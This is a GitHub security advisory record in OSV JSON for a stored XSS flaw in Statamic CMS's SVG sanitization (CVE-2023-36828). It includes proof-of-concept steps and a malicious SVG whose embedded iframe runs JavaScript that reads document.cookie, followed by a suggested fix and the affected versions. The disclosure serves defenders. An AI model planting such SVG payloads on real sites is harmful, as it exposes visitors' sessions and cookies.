@@ -1,0 +1,81 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-6r5g-cq4q-327g",
+  "modified": "2023-07-06T20:56:28Z",
+  "published": "2023-07-06T20:56:28Z",
+  "aliases": [
+    "CVE-2023-36828"
+  ],
+  "summary": "Statamic's Antlers sanitizer cannot effectively sanitize malicious SVG",
+  "details": "Antlers sanitizer cannot effectively sanitize malicious SVG\n\n### Summary\nThe SVG tag does not sanitize malicious SVG. Therefore, an attacker can exploit this vulnerability to perform XSS attacks using SVG, even when using the `sanitize` function.\n\n### Details\nRegarding the previous discussion mentioned [here](https://github.com/statamic/cms/security/advisories/GHSA-jvw9-rrc5-39g6#advisory-comment-84322), it has been identified that the default blacklist in the **FilesFieldtypeController** (located at this [link](https://github.com/statamic/cms/blob/f806b6b007ddcf066082eef175653c5beaa96d60/src/Http/Controllers/CP/Fieldtypes/FilesFieldtypeController.php#L15)) only blocks certain file extensions such as php, php3, php4, php5, and phtml. This allows a malicious user to upload a manipulated SVG file disguised as a social media icon, potentially triggering an XSS vulnerability.\n\n### PoC Screenshot\n![image](https://user-images.githubusercontent.com/17494868/251093022-15f949e9-2014-4069-850b-81940076745e.png)\n\n### PoC\n1. Create new Global set, let's say \"Settings\"\n2. Create a \"Grid\" field in Blueprint (named: social), then add somefields Name (text), URL (text) and Icon (Assets) in the section Fields.\n3. When calling the social setting in the `_footer.antlers.html`, remember to [sanitize](https://statamic.dev/modifiers/sanitize)\n```\n{{ settings:social }}\n    <a href=\"{{ $url }}\" class=\"ml-4\" aria-label=\"{{ $name }}\" rel=\"noopener\">\n        {{ svg :src=\"icon\" class=\"h-6 w-6 hover:text-hot-pink\" | sanitize }}\n    </a>\n{{ /settings:social }}\n```\n4. Upload the malicious SVG image, here is the code:\n```\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n   <text x=\"20\" y=\"35\">Statamic</text>\n   <foreignObject width=\"500\" height=\"500\">\n            <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:confirm(document.cookie);\" width=\"400\" height=\"250\"/>\n   </foreignObject>\n</svg>\n```\n\n\n\n### Impact\nSince the social media icon is displayed in the footer layout, any user can view it, potentially leading to the execution of XSS.\n\n### Suggestions to Mitigate or Resolve the Issue:\nSanitize when outputing the svg. This vulnerability caused by unsanitized `File::get()` when retrieving the SVG, it is crucial to sanitize the SVG when outputting it. The issue can be found in the following file: https://github.com/statamic/cms/blob/f806b6b007ddcf066082eef175653c5beaa96d60/src/Tags/Svg.php#L36-L40.\n\nIt is highly recommended to implement proper sanitization measures to ensure the security of the SVG content. One effective approach is to utilize a reliable package, such as https://github.com/darylldoyle/svg-sanitizer ,which provides comprehensive SVG sanitization capabilities.\n\nSo the code becomes:\n```php\nuse enshrined\\svgSanitize\\Sanitizer;\n\nif (File::exists($file)) {\n                \n    $sanitizer = new Sanitizer();\n    $dirtySVG = File::get($file);\n\n    $svg = $sanitizer->sanitize($dirtySVG);\n    break;\n}\n```\n\n### Reference\n- https://github.com/gogs/gogs/security/advisories/GHSA-ff28-f46g-r9g8\n- https://huntr.dev/bounties/34a12146-3a5d-4efc-a0f8-7a3ae04b198d/\n- https://blog.nintechnet.com/wordpress-elementor-plugin-fixed-svg-xss-protection-bypass-vulnerability/",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "statamic/cms"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.10.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/statamic/cms/security/advisories/GHSA-6r5g-cq4q-327g"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36828"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/statamic/cms/pull/8408"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/statamic/cms/commit/c714893ad92de6e5ede17b501003441af505b30d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/statamic/cms"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/statamic/cms/blob/f806b6b007ddcf066082eef175653c5beaa96d60/src/Http/Controllers/CP/Fieldtypes/FilesFieldtypeController.php#L15"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/statamic/cms/blob/f806b6b007ddcf066082eef175653c5beaa96d60/src/Tags/Svg.php#L36-L40"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/statamic/cms/releases/tag/v4.10.0"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-07-06T20:56:28Z",
+    "nvd_published_at": "2023-07-05T22:15:10Z"
+  }
+}
